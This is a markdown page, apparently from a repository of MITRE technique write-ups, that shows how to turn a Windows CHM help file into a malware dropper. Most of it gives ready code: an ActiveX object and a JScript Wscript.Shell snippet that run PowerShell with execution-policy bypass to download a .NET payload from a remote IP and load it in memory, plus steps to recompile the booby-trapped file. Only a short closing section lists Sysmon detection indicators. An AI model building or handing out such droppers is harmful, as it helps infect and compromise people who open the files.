## Compiled HTML Application

CHM files are help files in windows, just like the following

![NormalCHM](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Compiled HTML Apllication\Misc\NormalCHM.jpg)

this is the CHM file that came with process explorer from SysInternals, and like any windows based HTML files, it support *JS code* , so we can use JS to run PowerShell commands



if you have CHM file and you want to embed PowerShell script inside it, first you have to decompile the file

```powershell
hh.exe -decompile Extract doc.chm
```

you then we got many files htm and hhc file, open one of the htm and put this inside it

```xml
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c powershell -ep Bypass -nop -noexit -c ([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://[Remote_IP]/evil.exe')).EntryPoint.Invoke($Null,$Null))">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>

<SCRIPT>
x.Click();
</SCRIPT>
```

we created object with id x and put the PowerShell command in one of it's parameters then in the script tag we clicked on the object which fires the PowerShell

*about he entry point and invoke part, it will only work with .Net application so evil.exe must be .Net* 



we also can use chm as JS code so we can write malicious JS code inside the script tag and what's great about that is ***no Wscript process is created***, 

```vbscript
a = new ActiveXObject('Wscript.Shell');
cmd = "powershell -ep Bypass -nop -noexit -c ([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://[IP]/ransinvoke.exe')).EntryPoint.Invoke($Null,$Null))";
a.Run(cmd,0);
```



but what is not good that user got a displayed warning

![ActiveXunsafe](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Compiled HTML Apllication\Misc\ActiveXunsafe.JPG)

if user didn't click yes, the ActiveX object will not run, but also many error in chm will happen



After writing the above code into the htm file we need to compile it into chm file as example



**Steps for creating Malicious CHM**:



if we decompile the chm file and we got 

- doc.hhc
- doc.htm
- doc.htm2



1- we will open doc.html or doc htm2 and append the above malicious code into it

2- then we will write the following hpp file

```powershell
[OPTIONS]
Contents file=C:\Users\Noname\Downloads\PowerCollectionsCHM\mal\doc.hhc
[FILES]
C:\Users\Noname\Downloads\PowerCollectionsCHM\mal\doc.htm
C:\Users\Noname\Downloads\PowerCollectionsCHM\mal\doc1.htm
```

3- compile the file using

```powershell
C:\Program Files (x86)\HTML Help Workshop\hhc.exe' .\doc.hpp
```


### Detection

- sysmon
  - Process Creation
    - hh.exe process create with command line referring to the chm file
    - cmd process with hh.exe as parent (if Jscript would fire cmd and PS)
    - PowerShell process with cmd as parent, the same cmd that has hh.exe as parent (if Jscript would fire cmd and PS)


![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Compiled HTML Apllication\Misc\Mermaid.svg)


### Reference

[Link 1]: https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7	"cheat sheet"